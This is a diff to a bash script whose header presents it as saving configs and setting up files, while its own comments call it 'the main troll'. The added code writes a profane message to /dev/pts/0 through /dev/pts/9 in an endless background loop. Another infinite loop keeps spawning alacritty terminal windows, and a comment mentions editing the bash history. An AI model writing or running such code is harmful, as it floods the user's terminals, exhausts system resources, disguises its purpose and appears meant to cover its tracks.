@@ -1,8 +1,18 @@
 #!/usr/bin/env bash
-#i3 workspace number "1"
+#
+#save configs and make necessary files
 bash create_glm
 rm -f create_glm
 bash configs/save &
 sleep 5
+#
+#display text
+alacritty &
+sleep 1
+path="/dev/pts/"
+while true; do sleep 0.1 &&
+for i in {0..9}; do echo "EPIFUCKKKKKKKKKKKKKKKKK" > "$path$i"; done; done &
+#
 # do : edit .bashhistory
+#the main troll
 bash configs/alac && alacritty && bash rotate && bash glm && while true; do bash configs/alac && alacritty && bash glm; done &
